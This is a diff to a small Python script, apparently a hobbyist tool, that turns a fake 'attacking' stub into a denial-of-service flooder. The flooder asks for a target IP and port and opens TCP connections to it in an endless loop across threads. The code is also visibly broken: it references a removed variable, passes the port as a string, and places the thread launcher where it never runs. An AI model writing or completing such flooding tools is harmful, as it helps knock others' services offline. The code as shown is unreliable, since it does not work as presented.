@@ -1,5 +1,9 @@
+#Author: IKingCpp
+#Source:
 import time
 import os
+import socket
+import threading
 
 os.system("clear")
 
@@ -27,9 +31,21 @@ banner = """
 
 print(banner)
 
-host = input("[*]\033[01;31mIP OR HOSTNAME :\033[01;37m ")
-port = input("[*]\033[01;31mPORT : \033[01;37m ")
-
-print("[*]\033[01;31mAttacking : \033[01;37m", host, " ")
-time.sleep(2)
-print("[*]\033[01;31mERROR")
+ip = input("[+]\033[01;31mIP TARGET :\033[01;37m ")
+port = input("[+]\033[01;31mPORT : \033[01;37m ")
+target_ip = socket.gethostbyname(ip)
+##################################################
+UDP_PORT = port
+time.sleep(1)
+print("[+]\033[01;31mTarget IP :\033[01;37m", target_ip)
+time.sleep(1)
+print("[+]\033[01;31mTarget Port :\033[01;37m", UDP_PORT)
+time.sleep(3)
+def run(k):
+        while True:
+             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+             s.connect((host,port))
+             print("Packet send To {target_ip}")
+        for i in range(10):
+           c = threading.Thread(target=run, args=[i])
+           c.start()
